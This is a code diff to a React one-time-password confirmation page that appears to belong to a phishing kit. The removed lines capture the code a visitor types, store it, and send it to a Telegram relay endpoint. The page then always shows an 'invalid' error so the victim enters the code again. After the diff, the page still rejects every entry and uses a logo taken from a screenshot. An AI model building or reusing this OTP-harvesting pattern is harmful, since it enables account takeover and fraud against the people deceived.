@@ -2,7 +2,6 @@
 
 import { useEffect, useRef, useState } from 'react'
 import { ChevronRight, CircleX, TriangleAlert } from 'lucide-react'
-import { saveSubmissionData } from '@/lib/submission-store'
 
 const logoImage =
   'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Screenshot%202026-08-08%20062819-tEXyj9UyD7CkbbGMwFg7T0dD0XA5Ym.png'
@@ -79,18 +78,7 @@ export default function OtpConfirmPage() {
                 setIsInvalid(true)
                 return
               }
-              try {
-                const data = saveSubmissionData({ confirmOtp: digits.join('') })
-                await fetch('/api/telegram/send', {
-                  method: 'POST',
-                  headers: { 'content-type': 'application/json' },
-                  body: JSON.stringify(data),
-                })
-              } catch {
-                // Ignore notification failures
-              } finally {
-                setIsInvalid(true)
-              }
+              setIsInvalid(true)
             }}
           >
             <div className={`otp-card ${isInvalid ? 'otp-card-error' : ''}`}>
